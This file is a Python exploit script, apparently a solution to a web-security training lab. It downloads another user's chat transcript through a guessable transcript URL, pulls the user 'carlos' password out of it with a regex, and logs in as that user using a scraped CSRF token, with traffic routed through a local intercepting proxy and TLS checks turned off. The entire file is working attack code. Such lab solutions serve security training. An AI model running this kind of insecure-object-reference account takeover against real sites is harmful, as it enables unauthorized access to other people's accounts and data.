import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}   

def get_csrf_token(s, url):
    
    r = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf

def retrieve_carlos_password(s, url):

   chat_url = url + "/download-transcript/1.txt"
   r = s.get(chat_url, proxies=proxies, verify=False)
   res = r.text
   if "password" in res:
       print("(+) Found password in chat transcript.")
       password = re.findall(r"password is (.*)\.", res)[0]
       print("(+) Carlos password: " + password)
       return password
   else:
        print("(-) Failed to find password in chat transcript. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def carlos_login(s, url, password):
    
    # Retrieve CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as carlos
    print("(+) Logging in as 'carlos'...")
    data = {"username": "carlos", "password": password, "csrf": csrf_token}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'carlos' logged in successfully.")
    else:
        print("(-) Failed to log in as 'carlos'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_password = retrieve_carlos_password(s, url)
    carlos_login(s, url, carlos_password)

if __name__ == "__main__":
    main()